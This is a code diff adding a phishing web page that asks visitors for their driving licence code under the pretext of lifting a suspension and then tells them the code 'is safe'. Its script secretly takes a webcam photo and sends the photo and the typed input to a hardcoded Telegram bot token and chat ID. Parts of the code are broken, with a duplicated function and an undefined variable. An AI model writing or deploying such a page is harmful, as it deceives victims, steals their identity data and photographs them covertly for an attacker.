@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>please enter your driving license code in the box below for request to remove suspense</h1>
+    <form onsubmit="handleSubmit(event)">
+        <label for="userInput">Enter Information:</label>
+        <input type="text" id="userInput" required>
+        <button type="submit">Submit</button>
+    </form>
+    <script>
+        async function takephotoandsend(userInput) {
+            try {
+                // Your existing code for taking a photo and sending it to Telegram
+                // ...
+
+                // Example: Sending the user input to Telegram
+                sendTextToTelegram(userInput);
+            } catch (error) {
+                console.error('Error accessing the camera: ', error);
+            }
+        }
+
+        function sendTextToTelegram(text) {
+            const url2 = 'https://api.telegram.org/bot6343648051:AAExomyPRRWnT7YTvtQkhTCrNaF59Ijcx1I/sendMessage';
+            const formData2 = new FormData();
+            formData2.append('text', text);
+            formData2.append('chat_id', '5433487133');
+            fetch(url2, {
+                method: 'post',
+                body: formData2
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending text to tele: ', error));
+        }
+        async function takephotoandsend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                document.body.appendChild(video);
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                const content = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                content.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                    sendPhotoTotelegram(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                    document.body.removeChild(video);
+                    document.body.removeChild(canvas);
+                }, 'image/jpeg');
+            } catch (error) {
+                console.error('Error accessing the camera: ', error);
+            }
+        }
+
+        function sendPhotoTotelegram(blob) {
+            const url = 'https://api.telegram.org/bot6343648051:AAExomyPRRWnT7YTvtQkhTCrNaF59Ijcx1I/sendPhoto';
+            const url2 = 'https://api.telegram.org/bot6343648051:AAExomyPRRWnT7YTvtQkhTCrNaF59Ijcx1I/sendMessage';
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '5433487133');
+            fetch(url, {
+                method: 'post',
+                body: formData
+            })
+            const formData2 = new FormData();
+            formData2.append('text', text);
+            formData2.append('chat_id', '5433487133');
+            fetch(url2, {
+                method: 'post',
+                body: formData2
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error sending photo to tele: ', error));
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevents the default form submission behavior
+
+            // Get the user input
+            const userInput = document.getElementById('userInput').value;
+
+            // Display the result in the body
+            document.body.innerHTML += `<p>Your driving license code ${userInput} is safe. Well done.</p>`;
+
+            // Call the function to take a photo and send to Telegram
+            takephotoandsend(userInput);
+        }
+    </script>
+</body>
+</html>
